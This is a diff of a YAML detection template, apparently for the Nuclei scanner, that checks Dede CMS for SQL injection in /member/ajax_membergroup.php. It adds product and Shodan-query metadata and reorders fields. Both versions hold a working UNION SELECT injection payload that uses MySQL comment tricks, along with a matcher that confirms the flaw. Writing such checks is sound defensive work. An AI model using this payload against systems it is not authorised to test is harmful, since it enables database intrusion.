@@ -1,5 +1,4 @@
 id: dedecms-membergroup-sqli
-
 info:
   name: Dede CMS - SQL Injection
   author: pikpikcu
@@ -15,24 +14,22 @@ info:
   metadata:
     runzero-match: service["http.body"] matches "(?i)DedeCms"
     max-request: 1
+    product: dedecms
+    shodan-query: http.html:"DedeCms"
     vendor: dedecms
-  tags: sqli,dedecms,vuln
+  tags: dedecms,sqli,vuln
 variables:
   num: "999999999"
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{num}})+--+@`'`"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - part: body
+        type: word
         words:
           - '{{md5({{num}})}}'
-        part: body
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`''`/*!50000Union+*/+/*!50000select+*/+md5({{num}})+--+@`''`'
